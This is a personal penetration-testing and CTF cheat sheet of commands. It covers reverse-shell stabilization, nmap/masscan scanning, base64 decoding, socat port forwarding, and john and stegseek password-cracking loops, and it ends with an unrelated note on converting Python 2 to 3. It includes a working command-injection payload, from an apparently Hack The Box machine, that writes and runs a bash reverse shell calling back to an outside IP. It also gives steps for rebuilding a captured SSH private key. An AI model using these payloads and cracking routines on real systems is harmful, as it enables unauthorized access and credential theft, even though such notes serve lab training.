## 1. Stabilize your reverse shell
  
    
         python3 -c "import pty;pty.spawn('/bin/bash')"
         export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
         export TERM=xterm-256color
         alias ll='ls -lsaht --color=auto'
          ctrl+Z  (in target) 
         stty raw -echo;fg;reset
               press enter times 3
                   in my machine run 
                    stty -a ( output = speed 38400 baud; rows 40; columns 174; line = 0;)
                   Then in target run below 
         stty columns 174 rows 40
      
## 2. Nmap scan script
    $ cat nmap-scan.sh 
    ports=$(nmap -p- --min-rate=1000  -T4 $1 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
    nmap -sC -sV -p$ports $1
    sudo masscan 34.125.4.41  -p0-65535,U:0-65535

   #### usage
    $ ./nmap-scan.sh <ip_to_scan>
## 3. Crypto
#### base64 encode
    $ echo -n "administrator:password" | base64
    YWRtaW5pc3RyYXRvcjpwYXNzd29yZA==
#### base64 decode
    $ echo "YWRtaW5pc3RyYXRvcjpwYXNzd29yZA==" | base64 -d
    administrator:password 
#### For nested base64 files
    #!/usr/bin/env python3

    import sys
    import base64

    if len(sys.argv) < 2:
      print("Usage: {} <file.b64.txt>".format(sys.argv[0]))
      sys.exit(1)

    data = open(sys.argv[1], "r").read()

    while True:
      try:
        data = base64.b64decode(data)
      except:
        break

    print(data)
    
  ##### To use it:
 

    $ python3 decode_nested_b64.py b64.txt 
    b'flag 44: ygm2my89uqzirzj0nojw'
#### base32
    $ echo "NBSWY3DPEB3W64TMMQQQU===" | base32 -d
    hello world!
  
  ## Port forwading
  ### using socat 
          socat tcp-listen:9090,fork tcp:127.0.0.1:631  ....631 is internal port  ... 9090 is the port i will in mymachine
## BASH automation
*  cracking with all password list from seclists/Passwords
  
       for i in $(ls /usr/share/seclists/Passwords/ | grep .txt); do john hash /usr/share/seclists/Passwords/$i; done

 * cracking images
 
       for i in $(ls /usr/share/seclists/Passwords/ | grep *.txt); do stegseek event_banner.jpg /usr/share/wordlists/SecLists/Passwords/$i; done

   ### davzat hack the box machine getting shell
   
           POST /api/pet HTTP/1.1
            Host: pets.devzat.htb
            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
            Accept: */*
            Accept-Language: en-US,en;q=0.5
            Accept-Encoding: gzip, deflate
            Referer: http://pets.devzat.htb/api/pets/
            Content-Type: text/plain;charset=UTF-8
            Origin: http://pets.devzat.htb
            Content-Length: 126
            DNT: 1
            Connection: close

            {"name":"aaaaa","species":"gopher;echo 'bash -i >& /dev/tcp/10.10.14.68/4444 0>&1' > sh.sh; chmod +x sh.sh;/bin/bash ./sh.sh"}
### Formating an id_rsa
   
     echo "-----BEGIN OPENSSH PRIVATE KEY-----" > id_rsa
     
  then body 
  
    echo "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAt9IoI5gHtz8omhsaZ9Gy+wXyNZPp5jJZvbOJ946OI4g2kRRDHDm5x7up3z5s/H/yujgjgroOOHh9zBBuiZ1Jn1jlveRM7H1VLbtY8k/rN9PFe/MkRsYdH45IvVbhFErAeoncE3vJAAAACXJvb3RAbWV0YQE=" | sed 's/ /\n/g' >> id_rsa
    
 Then ending 
  
      echo "-----END OPENSSH PRIVATE KEY-----" >> id_rsa
      
### Convert Python 2 to python 3 using a python library.

We can convert Python2 scripts to Python3 scripts by using the 2to3 module. It changes Python2 syntax to Python3 syntax. We can change all the files in a particular folder from python2 to python3.

Step 1: Open your terminal and navigate to your File

Open your terminal or CMD depend on whatever you are using Windows or Linux.

Navigate to the directory where your python file(s) is/are located. (of course, using the “cd” command)

Step 2: Install the library

As usable, use pip to install 2to3, use can use any other library as well, I like 2to3

Commnd: pip install 2to3

Step 3: Convert the files
Excute: 2to3 [file or folder] -w
    
 
      
